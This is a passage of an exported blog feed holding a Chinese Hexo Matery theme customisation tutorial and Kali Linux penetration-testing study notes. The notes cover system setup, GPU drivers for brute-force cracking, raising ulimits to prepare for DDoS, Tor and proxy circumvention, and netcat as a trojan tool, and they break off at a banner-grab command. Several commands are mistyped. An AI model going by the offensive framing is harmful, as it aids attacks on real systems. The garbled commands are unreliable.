target="_blank"&gt;图标库&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="https://www.qvdv.com/tools/qvdv-guid.html" class="link-3" target="_blank"&gt;在线工具&lt;/a&gt;                        &lt;/li&gt;                        &lt;li&gt;&lt;a href="http://zhongguose.com/" class="link-3" target="_blank"&gt;中国色&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/div&gt;        &lt;script&gt; /*选择搜索引擎*/ $('.Select-box ul').hover(function () { $(this).css('height', 'auto') }, function () { $(this).css('height', '40px') }); $('.Select-box-2 ul').hover(function () { $(this).css('height', 'auto') }, function () { $(this).css('height', '46px') }); $('.Select-box li').click(function () { var _tihs = $(this).attr('class'); var _html = $(this).html(); if (_tihs == 'baidu_s') { _tihs = 'https://www.baidu.com/s'; _name = 'wd'; } if (_tihs == 'google_s') { _tihs = 'https://www.google.com/search'; _name = 'q'; } if (_tihs == 'bing_s') { _tihs = 'https://www.bing.com/search'; _name = 'q'; } $('.baidu form').attr('action', _tihs); $('.this_s').html(_html); $('#kw').attr('name', _name); $('.Select-box ul').css('height', '40px') }); $('.Select-box-2 li').click(function () { var _tihs = $(this).attr('class'); var _html = $(this).html(); if (_tihs == 'baidu_s') { _tihs = 'https://www.baidu.com/s'; _name = 'wd'; } if (_tihs == 'google_s') { _tihs = 'https://www.google.com/search'; _name = 'q'; } if (_tihs == 'bing_s') { _tihs = 'https://www.bing.com/search'; _name = 'q'; } $('.baidu form').attr('action', _tihs); $('.this_s').html(_html); $('#kw-2').attr('name', _name); $('.Select-box-2 ul').css('height', '48px') }); //清空输入框内容 $('.qingkong').click(function () { cls(); $(this).css('display', 'none') }); function cls() { var sum = 0; var t = document.getElementsByTagName("INPUT"); for (var i = 0; i &lt; t.length; i++) { if (t[i].type == 'text') { ++sum; t[i].value = "";//清空 } } } //清空输入框按钮的显示和隐藏 function if_btn() { var btn_obj = document.getElementById("kw") || document.getElementById("kw-2"); var cls_btn = document.getElementById("qingkong"); var btn_obj_val; var times; //当元素获得焦点时 if (btn_obj == '' || btn_obj == null) { return false; //如果没有找到这个元素，则将函数返回，不继续执行 } btn_obj.onfocus = function () { times = setInterval(function () { btn_obj_val = btn_obj.value; if (btn_obj_val != 0) { cls_btn.style.display = "block"; } else { cls_btn.style.display = "none"; } }, 200); } //元素失去焦点时 btn_obj.onblur = function () { clearInterval(times); } } &lt;/script&gt;    &lt;/div&gt;&lt;/div&gt;&lt;style&gt;    * {        margin: 0;        padding: 0;        font-family: "微软雅黑"    }    ul,li,h1,h2,h3,h4,h5,h6,p,form,dl,dt,dd {        margin: 0px;        padding: 0px;        font-size: 14px;        font-weight: normal;    }    img {        border-style: none;    }    li {        list-style: none;        float: left    }    a {        text-decoration: none    }    .card {        background-color: rgba(25, 240, 229, 0);        width: 96%;        margin-left: 2%    }    .baidu {        float: left;        margin-left: 100px;    }    .baidu form {        position: relative    }    .Select-box ul {        height: 40px;        position: absolute;        left: -1px;        top: 0px;        z-index: 9999;        background: #FFF;        border: 1px solid #ccc;        border-top: none;        overflow: hidden    }    .Select-box li {        width: 60px;        line-height: 40px;        font-size: 14px;        color: #484848;        border: 0;        cursor: pointer;    }    .Select-box li:hover {        background: #3385ff;        color: #FFF;    }    .Select-box .this_s {        color: #317ef3;    }    .Select-box .this_s:hover {        background: #FFF;        color: #317ef3;    }    .qingkong {        position: absolute;        right: 120px;        top: 12px;        width: 18px;        height: 18px;        background: rgba(0, 0, 0, 0.1);        border-radius: 18px;        line-height: 16px;        color: #666666;        cursor: pointer;        text-align: center;        font-size: 14px;        display: none;    }    .qingkong:hover {        background: rgba(0, 0, 0, 0.2);    }    .qingkong:active {        background: rgba(0, 0, 0, 0.3);    }    .baidu-2 {        width: 100%;        height: 110px;        margin: 0 auto;        background: none;        padding-top: 50px;    }    .baidu-2 form {        width: 520px;        margin: 0 auto;    }    .baidu-2 input {        padding: 13px 8px;        opacity: 0.9;        font-size: 15px;    }    #Select-2 {        float: left;    }    .Select-box-2 {        text-align: center;        float: left;        position: relative;    }    .Select-box-2 ul {        height: 46px;        position: absolute;        left: 0px;        top: 1px;        z-index: 9999;        background: rgba(255, 255, 255, 0.9);        border: 1px solid #ccc;        border-top: none;        overflow: hidden    }    .Select-box-2 li {        width: 60px;        line-height: 46px;        font-size: 15px;        color: #484848;        border: 0;        cursor: pointer;    }    .Select-box-2 li:hover {        background: #3385ff;        color: #FFF;    }    .Select-box-2 .this_s {        color: #317ef3;    }    .Select-box-2 .this_s:hover {        background: none;        color: #317ef3;    }    #kw-2 {        width: 335px;        outline: 0;        border: 1px solid #ccc;        background: rgba(255, 255, 255, 0.2);        color: #000000;        padding-left: 70px;        font-weight: bold;    }    /*修改搜索框样式*/    #su-2 {        width: 90px;        background: blue;        border: none;        border-top: #3385ff 1px solid;        border-bottom: 1px solid #2d78f4;        color: #FFF;        cursor: pointer;        /*去轮廓阴影*/        outline: none;    }    /*光标移动到搜索框颜色*/    #su-2:hover {        background: blue;        border-bottom: 1px solid blue;    }    #su-2:active {        background: blue;        box-shadow: inset 1px 1px 3px blue;        -webkit-box-shadow: inset 1px 1px 3px blue;    }    .jj-list-tit {        font-size: 16px;        line-height: 25px;        color: #ffffff;        width: 100%;        padding-left: 38.5%;    }    .jj-list-con {        overflow: hidden;        margin: 0 auto    }    /*控制网站列表间距*/    .jj-list-con li {        width: 31.333%;        margin: 1%;    }    .link-3 {        display: block;        background: rgba(0, 0, 0, .35);        color: #FFF;        font-size: 13px;        text-align: center;        line-height: 35px;        padding: 4px 0;        border-radius: 2px;        transition: all 0.2s    }    .link-3:hover {        background: rgba(0, 0, 0, .45);        font-size: 15px;        font-weight: bold    }    /*1栏 小于584*/    @media only screen and (max-width: 584px) {        .navi-height {            height: 1300px;        }        .link-box {            margin-top: 5%;        }        .large-screen {            display: none;        }    }    /* 2栏 大于584 小于993px */    @media only screen and (min-width: 584px) and (max-width: 993px) {        .navi-height {            height: 800px;        }        .link-box {            margin-top: 5%;        }        .large-screen {            display: none;        }    }    /*3栏 大于993px*/    @media only screen and (min-width: 993px) {        .navi-height {            position: absolute;            width: 100%;            height: 100%;        }    }    /* 隐藏footer */    .page-footer {        display: none;    }&lt;/style&gt;&lt;% if (theme.banner.enable) { %&gt;&lt;script&gt;    // 每天切换 banner 图.  Switch banner image every day.    var bannerUrl = "&lt;%- theme.jsDelivr.url %&gt;&lt;%- url_for('/medias/banner/') %&gt;" + new Date().getDay() + '.jpg';    $('.bg-cover').css('background-image', 'url(' + bannerUrl + ')');&lt;/script&gt;&lt;% } else { %&gt;&lt;script&gt;    $('.bg-cover').css('background-image', 'url(&lt;%- theme.jsDelivr.url %&gt;&lt;%- url_for('/medias/banner/0.jpg') %&gt;)');&lt;/script&gt;&lt;% } %&gt;</code></pre><p>且主题的_config.yml文件中导航栏中要有</p><pre><code>导航:    url: /navigate    icon: fas fa-location-arrow</code></pre><h4 id="去掉banner图的动态滤镜颜色并修改导航栏颜色"><a href="#去掉banner图的动态滤镜颜色并修改导航栏颜色" class="headerlink" title="去掉banner图的动态滤镜颜色并修改导航栏颜色"></a>去掉banner图的动态滤镜颜色并修改导航栏颜色</h4><ol><li>去掉动态滤镜颜色</li></ol><p>打开<code>themes/matery/source/css/matery.css</code>文件，查找<strong>rainbow</strong>属性，然后将其注释即可。如下：</p><pre><code>/*如果想去掉banner图的颜色渐变效果，请将以下的css属性注释掉或者删除掉即可*/@-webkit-keyframes rainbow {   /* 动态切换背景颜色. */}@keyframes rainbow {    /* 动态切换背景颜色. */}</code></pre><ol><li>修改导航栏颜色及透明效果</li></ol><p>打开<code>themes/matery/source/css/matery.css</code>文件，大约在250行，有一个<code>.bg-color</code>属性，修改其属性值即可，代码如下</p><pre><code>.bg-color {    background-image: linear-gradient(to right, #4cbf30 0%, #0f9d58 100%); //修改成自己喜欢的颜色值    opacity: 0.8;  //透明效果 值范围 0~1，看情况自己修改}</code></pre><h4 id="添加首页动态打字效果副标题"><a href="#添加首页动态打字效果副标题" class="headerlink" title="添加首页动态打字效果副标题"></a>添加首页动态打字效果副标题</h4><p>在主题配置文件中，找到下面的配置</p><pre><code># 网站副标题，打字效果# 如果有符号 ‘ ，请在 ’ 前面加上 \subtitle:   enable: true  loop: true # 是否循环  showCursor: true # 是否显示光标  startDelay: 300 # 开始延迟  typeSpeed: 100 # 打字速度  backSpeed: 50 # 删除速度  sub1: 志之所向，金石为开，谁能御之？  sub2: 花开不是为了花落，而是为了开的更加灿烂。  sub3: 没有伞的孩子必须努力奔跑！  sub4: 欲望以提升热忱，毅力以磨平高山。  sub5: 如果放弃太早，你永远都不知道自己会错过什么。  sub6: 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生。</code></pre><p>注意：</p><p>网站打字效果副标题默认有两个，即sub1和sub2，如果想写多个，则需要修改两处地方，首先修改配置文件，如上面所示，在sub1和sub2后面继续添加即可，然后在去主题目录下的layout文件夹下的_partial文件夹，修改bg-cover-content.ejs文件，大约在12行左右，如下面所示：</p><pre><code> &lt;div class="description center-align"&gt;     &lt;% if (theme.subtitle.enable) { %&gt;         &lt;span id="subtitle"&gt;&lt;/span&gt;         &lt;script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11"&gt;&lt;/script&gt;        &lt;script&gt;            var typed = new Typed("#subtitle", {                strings: ['&lt;%= theme.subtitle.sub1 %&gt;',                          '&lt;%= theme.subtitle.sub2 %&gt;',                          '&lt;%= theme.subtitle.sub3 %&gt;',                          '&lt;%= theme.subtitle.sub4 %&gt;',                          '&lt;%= theme.subtitle.sub5 %&gt;',                          '&lt;%= theme.subtitle.sub6 %&gt;'],                 startDelay: &lt;%= theme.subtitle.startDelay %&gt;,                 typeSpeed: &lt;%= theme.subtitle.typeSpeed %&gt;,                 loop: &lt;%= theme.subtitle.loop %&gt;,                    backSpeed: &lt;%= theme.subtitle.backSpeed %&gt;,                 showCursor: &lt;%= theme.subtitle.showCursor %&gt;              });          &lt;/script&gt;      &lt;% } else { %&gt;            &lt;%= config.description %&gt;      &lt;% } %&gt;&lt;/div&gt;</code></pre><h4 id="动态标题"><a href="#动态标题" class="headerlink" title="动态标题"></a>动态标题</h4><p>先放上效果图再说：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/21/blog/3.png" alt=""></p><p>实现方法，引入js文件，在主题文件下的<code>/source/js/</code>下新建<code>FunnyTitle.js</code>，然后在添加到<code>themes/matery/layout/layout.ejs</code>或者添加到<code>themes/matery/layout/_partial/head.ejs</code>，其代码如下：</p><pre><code>&lt;!--浏览器搞笑标题--&gt; var OriginTitle = document.title; var titleTime; document.addEventListener('visibilitychange', function () {     if (document.hidden) {         $('[rel="icon"]').attr('href', "https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/favicon.png");         document.title = 'ヽ(●-`Д´-)ノ你要玩捉迷藏嘛';         clearTimeout(titleTime);     }     else {         $('[rel="icon"]').attr('href', "https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/favicon.png");         document.title = 'ヾ(Ő∀Ő3)ノ好哦！' + OriginTitle;         titleTime = setTimeout(function () {             document.title = OriginTitle;         }, 2000);     } });</code></pre><p>我的链接：<strong><a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@3.2.5/source/js/FunnyTitle.js" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/Yafine/cdn@3.2.5/source/js/FunnyTitle.js</a></strong>（理论上一直有效）</p><p>或者直接在<code>themes/matery/layout/layout.ejs</code>文件中添加如下代码：</p><pre><code>&lt;script type="text/javascript"&gt;    var OriginTitile=document.title,st;    document.addEventListener("visibilitychange",function(){        document.hidden?(document.title="ヽ(●-`Д´-)ノ你要玩捉迷藏嘛",clearTimeout(st)):(document.title="(Ő∀Ő3)ノ好哦！",st=setTimeout(function(){document.title=OriginTitile},3e3))    })&lt;/script&gt;</code></pre><h2 id="自适应屏幕的时候字体大小"><a href="#自适应屏幕的时候字体大小" class="headerlink" title="自适应屏幕的时候字体大小"></a>自适应屏幕的时候字体大小</h2><p>修改<code>matery/source/css/matery.css</code>,这样在手机等小屏幕上显示的字体大小就正常了,否则会因为标题字太长导致换行</p><pre><code>---------------------------- source/css/matery.css ----------------------------/*全局基础样式*//*小屏幕下(手机类)的样式*/@media only screen and (max-width: 601px) {    .container {        width: 95%;    }    header .brand-logo .logo-span {        font-size: 1rem;    }    .bg-cover .title {        font-size: 3rem;        font-weight: 700;        line-height: 1.85em;        margin-bottom: 20px;        position: relative;    }}/*中等屏幕下(平板类)的样式*/@media only screen and (min-width: 600px) and (max-width: 992px) {    .container {        width: 90%;    }    header .brand-logo .logo-span {        font-size: 2rem;    }    .bg-cover .title {        font-size: 4rem;        font-weight: 700;        line-height: 1.85em;        margin-bottom: 20px;        position: relative;    }}/*大屏幕下(桌面类)的样式*/@media only screen and (min-width: 993px) {    .container {        width: 85%;        max-width: 1125px;    }    .post-container {        width: 90%;        margin: 0 auto;        max-width: 1250px;    }    header .brand-logo .logo-span {        font-size: 2rem;    }    .bg-cover .title {        font-size: 4rem;        font-weight: 700;        line-height: 1.85em;        margin-bottom: 20px;        position: relative;    }}</code></pre><h3 id="文章自动分类"><a href="#文章自动分类" class="headerlink" title="文章自动分类"></a>文章自动分类</h3><p><a href="https://blog.eson.org/pub/e2f6e239/" target="_blank" rel="noopener">https://blog.eson.org/pub/e2f6e239/</a></p><h2 id="添加文章显示作者名字"><a href="#添加文章显示作者名字" class="headerlink" title="添加文章显示作者名字"></a>添加文章显示作者名字</h2><pre><code>---------------------- layout/_partial/post-detail.ejs -----------------------&lt;div class="info-break-policy"&gt;    &lt;% if (page.author &amp;&amp; page.author.length &gt; 0) { %&gt;        &lt;i class="fa fa-pencil"&gt;&lt;/i&gt; 作者: &lt;%- page.author %&gt;     &lt;% } else { %&gt;    &lt;i class="fa fa-pencil"&gt;&lt;/i&gt; 作者: &lt;%- config.author %&gt;    &lt;% } %&gt;&lt;/div&gt;</code></pre><h2 id="Hexo异常报错"><a href="#Hexo异常报错" class="headerlink" title="Hexo异常报错"></a>Hexo异常报错</h2><ol><li>Cannot set property ‘lastIndex’ of undefined</li></ol><pre><code>INFO  Start processingFATAL Something's wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.htmlTypeError: Cannot set property 'lastIndex' of undefined at highlight (/Users/chenshang/Blog/node_modules/highlight.js/lib/highlight.js:579:35) at /Users/chenshang/Blog/node_modules/highlight.js/lib/highlight.js:629:21 at Array.forEach () at Object.highlightAuto (/Users/chenshang/Blog/node_modules/highlight.js/lib/highlight.js:628:62) at /Users/chenshang/Blog/node_modules/hexo-util/lib/</code></pre><p>修改配置文件<code>_config.yml</code>，注意不是主题里面的配置文件！把<code>auto_detect</code>设置为false，即可解决。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali</title>
      <link href="/2020/08/18/kali/"/>
      <url>/2020/08/18/kali/</url>
      
        <content type="html"><![CDATA[<h1 id="Kali-Linux（安全牛学习）"><a href="#Kali-Linux（安全牛学习）" class="headerlink" title="Kali Linux（安全牛学习）"></a>Kali Linux（安全牛学习）</h1><h2 id="渗透测试准备基础"><a href="#渗透测试准备基础" class="headerlink" title="渗透测试准备基础"></a>渗透测试准备基础</h2><h3 id="静态IP配置"><a href="#静态IP配置" class="headerlink" title="静态IP配置"></a>静态IP配置</h3><p>修改文件/etc/network/interface</p><pre><code>allow-htoplug eth0iface eht0 inet staticaddress 192.168.0.1netmask 255.255.255.0gateway 192.168.0.254dns-nameservers 192.168.0.10 192.168.0.20</code></pre><h3 id="更新升级"><a href="#更新升级" class="headerlink" title="更新升级"></a>更新升级</h3><p>因为kali linux经常更新软件包，所以需要时刻保持系统是最新版的</p><p>更新系统的命令是</p><pre><code>#apt-get update     #更新软件包的索引文件如果更新索引文件出现异常则用下面的命令#apt-get update --fix-missing#apt-get upgrade    #更新软件包文件</code></pre><p>更改软件包的更新源<br>科技大学更新源</p><pre><code>deb http://mirrors.ustc.edu.cn/kali kali main non-free contribdeb-src http://mirrors.ustc.edc.cn/kali kali main non-free contribdeb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</code></pre><p>版本更新</p><pre><code>#apt-get dis-upgrade</code></pre><p>重复执行</p><h3 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a>安装软件包</h3><pre><code>#apt-get install smplayer ibus ibus-pinyin flashplugin-nonfree gdebi amule qbittorrent geany stardict meld fff-way -microhei kchmviewer freemind netspeed mtr filezilla filezilla-common chromium monodevelop mono-gmcs -y</code></pre><p>图形化软件安装包程序</p><pre><code>#dpkg -i asd.deb</code></pre><h3 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>安装浏览器插件是为了以后的web渗透所准备的</p><p>Firefox浏览器插件</p><p>flashgot、autoproxy、Tamper Data、cookie importer、Cookies Manager、User Agent Switcher、HackBar、Live http header、Firebug、Download YouTube Videos as MP4、Flagfox、hashr</p><p> 安装方法</p><p>打开浏览器按ALT键打开菜单，下拉Tools，点击addons，然后搜索即可。</p><p>SQL inject Me和XSS Me 通过以下两个网址安装，直接download即可。</p><p><a href="https://addons.mozilla.org/en-US/firefox/addon/xss-me/" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/xss-me/</a></p><p><a href="https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/$src=ss" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/$src=ss</a></p><h3 id="安装JAVA"><a href="#安装JAVA" class="headerlink" title="安装JAVA"></a>安装JAVA</h3><p>下载安装包</p><p><a href="http://java.sun.com/javase/downloads/index.jsp" target="_blank" rel="noopener">http://java.sun.com/javase/downloads/index.jsp</a></p><p>解压安装包  tar -zxvf ############ ，然后将解压出来的目录移动到/usr/bin目录下#mv jdk1.8.0_45 /usr/bin，#cd /usr/bin/jdk1.8.0_45然后安装注册</p><pre><code>#update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_45/bin/java 1#update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_45/bin/javac 1#update-alternatives --install /usr/lib/mozilla/plugins/libjavaplugin.so mozilla-javaplugin.so /opt/jdk1.8.0_45/jre/lib/amd64/linpjp2.so 1</code></pre><p>使注册默认生效（默认设置）</p><pre><code>#update-alternatives --set java /opt/jdk1.8.0_45/bin/java#update-alternatives --set javac /opt/jdk1.8.0_45/bin/javac#update-alternatives --set mozilla-javaplugin.so /opt/jdk1.8.0_45/jre/lib/amd64/libnpjp2.so</code></pre><p>验证</p><pre><code>#java -version</code></pre><p>在<a href="http://www.java.com/en/download/installed.jsp验证java安装是否完成。" target="_blank" rel="noopener">http://www.java.com/en/download/installed.jsp验证java安装是否完成。</a></p><p>方法2：</p><p>​    将文件夹放在/opt目录下，修改文件/etc/profile，在底部加上以下内容</p><pre><code>JAVA_HOME=/opt/jdk1.8.0_131　　　#把值修改成自己的路径CLASSPATH=.:$JAVA_HOME/lib.tools.jarPATH=$JAVA_HOME/bin:$PATHexport JAVA_HOME CLASSPATH PATH</code></pre><p>然后更新一下#source /etc/profile</p><h3 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h3><p>GPU的用途        Nvidia         Ati</p><p>显卡有上千核，可以很有效的进行一些暴力破解</p><p>NVIDIA显卡驱动安装</p><pre><code>#apt-get update#apt-get dist-upgrade#apt-get install -y linux-headers-$(uname -r)#apt-get install nvidia-kernel-dkms#sed 's/quiet/quiet nouveau.modeset=0/g' -i /etc/default/grub#update-grub#reboot验证#glxinfo | grep -i "direct rendering"显示yes即成功</code></pre><h3 id="无线网卡补丁"><a href="#无线网卡补丁" class="headerlink" title="无线网卡补丁"></a>无线网卡补丁</h3><p>最新版内核已经集成无线驱动补丁</p><pre><code>#uname -a      #查看内核版本</code></pre><p>如果是老版本内核</p><pre><code>#cd /usr/src/#wget https://www.kernel.org/pub/linux/kernel/projects/backports/stable/v3.12/backports-3.12-1.tar.bz2     #下载版本视内核情况而定#tar xvf backports-3.12-1.tar.bz2#cd backports-3.12-1#apt-get install patch#wegt http://patches.aircrack-ng.org/mac80211.compat08082009.wl_frag+ack_vl.patch#patch -pl&lt;mac80211.compat08082009.wl_frag+ack_vl.patch&gt;#apt-get install libncurses5-dev#airmon-ng          #查看驱动#make defconfig-ath9k#make &amp;&amp; make install</code></pre><h3 id="并发线程限制"><a href="#并发线程限制" class="headerlink" title="并发线程限制"></a>并发线程限制</h3><p>为以后DDoS攻击做准备</p><p>Ulimite用于限制<strong>当前</strong>shell内进程的资源使用</p><p>查看默认值</p><pre><code>#ulimit -a</code></pre><h4 id="用途距离"><a href="#用途距离" class="headerlink" title="用途距离"></a>用途距离</h4><p>​    ·限制 堆栈大小：#ulimit -s 100</p><p>​    ·限制shell内存使用：#ulimit -m 5000 -v 5000</p><p>修改root家目录下的.bashrc文件可以永久生效</p><p>通过修改open files即#ulimit -n 90000000 来为之后的DDoS需要打开的文件做上限修改</p><h3 id="电源优化"><a href="#电源优化" class="headerlink" title="电源优化"></a>电源优化</h3><p>·渗透测试系统耗电较大</p><p>·延长电池寿命</p><pre><code> ·无操作挂起、关闭显示器</code></pre><p>​     ·降低显示器亮度</p><p>​     ·不使用时关闭无线网卡</p><p>​     ·开启硬盘省电选项</p><pre><code>#hdparm -i /dev/sda if AdvancedPM=yes then hdparm -B 1 -S 12 /dev/sda</code></pre><p> ·启动笔记本模式</p><pre><code>笔记本模式脚本#!/bin/bashcurrrrentMode=$(cat /proc/sysvm/laptop_mode)if[$currentMode -eq 0]thenecho "5" &gt; /proc/sys/vm/laptop_modeecho "Laptop Mode Enabled"elseecho "0" &gt; /proc/sys/vm/laptop_modeecho "Laptop Mode Disabled"fi</code></pre><h3 id="服务开关"><a href="#服务开关" class="headerlink" title="服务开关"></a>服务开关</h3><p>kali linux默认未启动所有网络服务</p><p>临时开启网络服务</p><pre><code>#/etc/init.d/ssh start</code></pre><p>永久开启网络服务</p><pre><code>#update-rc.d ssh default#update-rc.d ssh start 20 2 3 4 5 .stop 20 0 1 6 .运行级别0-6#update-rc.d A defaults 80 20     #80是启动优先级，20是关闭优先级#update-rc.d B defaults 90 10     #数值越大优先级越小</code></pre><h3 id="翻墙-amp-代理"><a href="#翻墙-amp-代理" class="headerlink" title="翻墙&amp;代理"></a>翻墙&amp;代理</h3><h4 id="GFW长城防火墙"><a href="#GFW长城防火墙" class="headerlink" title="GFW长城防火墙"></a>GFW长城防火墙</h4><p>​    ·Facebook、YouTube    </p><h4 id="翻墙"><a href="#翻墙" class="headerlink" title="翻墙"></a>翻墙</h4><p>​    ·http代理        http是一个明文传输的协议容易被GFW所发现，他会更新自己的策略库来阻挡用户。但是可以用https对传输来进行加密。</p><p>​    ·socks代理</p><p>​    ·ssh隧道</p><p>​    ·VPN</p><h4 id="翻墙软件"><a href="#翻墙软件" class="headerlink" title="翻墙软件"></a>翻墙软件</h4><p>​    ·Goagent （现在已经GoAgent已经成为过去式了）</p><p>​        下载网址：<a href="https://cod.gode.google.com/p/goagent/或者https://github.com/goagent/goagent" target="_blank" rel="noopener">https://cod.gode.google.com/p/goagent/或者https://github.com/goagent/goagent</a>            </p><p>​            ·注册：appengine.google.com</p><p>​            过程：IE→goagent→GAE→目标网站</p><p>ip138.com可以查看自己的公网地址</p><p>​    ·<strong>Tor</strong>                <strong>暗网</strong></p><h4 id="代理的意义所在"><a href="#代理的意义所在" class="headerlink" title="代理的意义所在"></a>代理的意义所在</h4><p>​    ·加密通信</p><p>​    ·隐藏来源</p><p>​    ·突破网络封锁</p><h4 id="GOAGENT安装"><a href="#GOAGENT安装" class="headerlink" title="GOAGENT安装"></a>GOAGENT安装</h4><p>在kali linux系统下</p><p>​    ·依赖数据包</p><pre><code>#apt-get install python-dev python-greenlet python-gevent python-vte python-openssl python-crypto python-appindicator python-pip libnss3-lools</code></pre><pre><code>#pip install pyOpenSSL#pip install gevent --upgrade#mkdir -p ~/.pki/nssdb#certutil -d sql:$HOME/.pki/nssdb -N  #提示输入密码，两次回车，什么也不输入</code></pre><h5 id="配置浏览器"><a href="#配置浏览器" class="headerlink" title="配置浏览器"></a>配置浏览器</h5><p>配置证书：打开浏览器，按ALT键，下拉Edit，点击Preferences，点击Advanced，再点击Certificates，再点击View Certificates，选择到Authorities，点击import，找到Agent文件夹里面的CA.crt，然后三个信任勾选，一直OK即可。</p><p>安装了add-ons插件之后，浏览器上方会有一个<strong>福</strong>字，点击福字右边的下拉，选择首选项，选择代理服务器，选择编辑代理服务器，里面有GoAgent即可。再点击下拉框点击默认代理，选择GoAgent。点击下拉框选择全局模式。</p><p>运行GoAgent，查看，显示白字都没问题，即可使用。</p><h3 id="TOR"><a href="#TOR" class="headerlink" title="TOR"></a>TOR</h3><p>保护隐私防止被追踪</p><p>志愿者组成的网络中转节点</p><p>暗网</p><p>​    ·互联网搜索引擎无法发现</p><p>​    ·互联网黑市</p><p>下载和看视频是不道德的行为</p><p>下载：<a href="https://www.torproject.org/download/download-easy.html.en#linux" target="_blank" rel="noopener">https://www.torproject.org/download/download-easy.html.en#linux</a>     </p><p>​            需要翻墙</p><p>​    ·问题1：should not be run as root；</p><p>​    ·问题2：服务启动错误</p><p>暗网wiki</p><p>​    ·<a href="http://zpktlwi4fecvo6ri.onion/wiki/index.php/Main_Page" target="_blank" rel="noopener">http://zpktlwi4fecvo6ri.onion/wiki/index.php/Main_Page</a></p><p>暗网里的网站都是以onion为域名</p><p>下载好软件包，进入文件夹，点击Tor Browser Setup，会报错，进入Browser目录，找到start-tor-browser，编辑它，搜索root，找到一行关于报错判断的语句，把判断eq后面的0改为任何数字，保存即可。但是会有另一个错误，是权限造成的，修改文件夹的所有者和所有组为root，#chown  R root:root tor-browser_zh-CN，双击即可运行，点击连接是无法连接成功的，点击配置，ISP是否对Tor进行了封锁选择<strong>是</strong>，然后下一步，使用集成的网桥进行连接，选择meek-azure或meek-google或者meek-amazon都可以，这一步是选择云，下一步，是否需要本地代理访问互联网，选择否，点击连接。</p><p>使用Tor的集成浏览器，最大化Tor Browser窗口之后，网站可获取显示器尺寸信息，从而可跟踪用户。</p><p>可以通过#netstat -pantu | grep tor    来查看后台客户端tor在侦听的端口。</p><h4 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h4><p>可以修改apt-get的配置文件，使apt-get update 更新时使用代理来访问国外的源。</p><pre><code>#vi /etc/apt/apt.conf    Acquire::http::Proxy"http://127.0.0.1:8087";    也可以加入以下配置    Acquire::ftp::Proxy"ftp://127.0.0.1:8087/";    Acquire::https::Proxy"ftp://127.0.0.1:8087/";    Acquire::socks::Proxy"ftp://127.0.0.1:8087/";</code></pre><p>编辑/etc/bash.bashrc可以使命令也可以用代理，如下：</p><pre><code>#vi /etc/bash.bashrc    export http_proxy="http://127.0.0.1:8087"</code></pre><p>可以使用curl 加一个网页来验证是否代理</p><h4 id="代理链"><a href="#代理链" class="headerlink" title="代理链"></a>代理链</h4><p>通过编辑/etc/proxychains.conf  可以进行动态代理，静态代理和随机代理</p><h3 id="实验环境搭建"><a href="#实验环境搭建" class="headerlink" title="实验环境搭建"></a>实验环境搭建</h3><p>微软最新版软件</p><p>​    <a href="http://msdn.microsoft.com/en-ca/subscriptions/aa336858" target="_blank" rel="noopener">http://msdn.microsoft.com/en-ca/subscriptions/aa336858</a></p><p>windows虚拟机</p><p>​    <a href="http://dev.modern.ie/tools/vms/" target="_blank" rel="noopener">http://dev.modern.ie/tools/vms/</a></p><p>安装自己的虚拟机</p><p>​    xp；win7；2003</p><p>linux虚拟机</p><p>​    <a href="http://www.turnkeylinux.org" target="_blank" rel="noopener">http://www.turnkeylinux.org</a></p><p>​    Ubuntu</p><p>​        Lamp安装</p><p>Metasploitable2</p><p>​    <a href="http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip" target="_blank" rel="noopener">http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip</a></p><p>​    问题：/var/www/mutillidae/config.inc</p><p>​        dbname=owasp10</p><br><h2 id="渗透工具"><a href="#渗透工具" class="headerlink" title="渗透工具"></a>渗透工具</h2><h3 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h3><h4 id="NETCAT——NC"><a href="#NETCAT——NC" class="headerlink" title="NETCAT——NC"></a>NETCAT——NC</h4><h5 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h5><p>​    可以取代Telnet/获取banner信息</p><p>​    网络工具中的瑞士军刀——小身材、大智慧</p><p>​    侦听模式/传输模式</p><p>​    传输文本信息</p><p>​    传输文件/目录</p><p>​    加密传输文件</p><p>​    远程控制/木马</p><p>​    加密所有流量</p><p>​    流媒体服务器</p><p>​    远程克隆硬盘</p><h5 id="TELNET-BANNER"><a href="#TELNET-BANNER" class="headerlink" title="TELNET/BANNER"></a>TELNET/BANNER</h5><p>​    nc -nv 1.1.1.1 110        </p><p>​    nc -nv 1.1.1.1 25            SMTP</p><p>​    nc -nv 